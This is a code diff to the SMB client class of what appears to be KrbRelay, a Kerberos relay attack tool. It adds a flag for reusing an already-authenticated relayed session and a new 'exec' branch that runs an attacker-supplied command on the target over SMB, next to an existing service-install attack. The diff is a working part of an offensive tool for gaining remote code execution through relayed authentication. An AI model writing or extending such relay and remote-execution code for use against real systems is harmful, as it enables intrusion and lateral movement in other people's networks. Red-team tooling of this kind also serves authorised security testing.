@@ -3,10 +3,13 @@
 using SMBLibrary.Client;
 using SMBLibrary.Services;
 using System;
+using System.Data.SqlTypes;
 using System.IO;
 using System.Linq;
 using System.Net.Sockets;
 using System.Reflection;
+using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using static KrbRelay.Program;
 
@@ -15,6 +18,7 @@ namespace KrbRelay.Clients
     public class Smb
     {
         private Socket _clientSocket = null;
+        public bool alreadyLoggedIn = false;
         public Smb()
         {
             ;
@@ -55,10 +59,13 @@ namespace KrbRelay.Clients
                                                          //Array.Copy(Program.apreqBuffer, fraglen-authlen, destinationArray, 0,authlen);
             ticket = apreqBuffer;
 
-
-            byte[] response = smbc.Login(ticket, out bool success);
-            Console.WriteLine("[*] Login success: {0}", success);
-
+            bool success = true;
+            byte[] response=null;
+            if (!alreadyLoggedIn)
+            {
+                response = smbc.Login(ticket, out success);
+                Console.WriteLine("[*] Login success: {0}", success);
+            }
             if (!success)
             {
                 if (Program.ntlm)
@@ -113,6 +120,15 @@ namespace KrbRelay.Clients
                         string arg2 = attacks["service-add"].Split(new[] { ' ' }, 2)[1];
 
                         Attacks.Smb.ServiceManager.serviceInstall(smbc, arg1, arg2);
+                    }
+                    if (attacks.Keys.Contains("exec"))
+                    {
+                        //string arg1 = attacks["exec"].Split(new[] { ' ' }, 2)[0];
+                        //string arg2 = attacks["exec"].Split(new[] { ' ' }, 2)[1];
+                        
+                        //tring randomStr = new string(Enumerable.Range(0, 8).Select(_ => (char)('a' + new Random().Next(26))).ToArray());
+                        KrbRelay.Clients.Attacks.Smb.Shares.ExecComnmand(smbc, attacks["exec"]);
+                        
                     }
                 }
                 catch (Exception e)
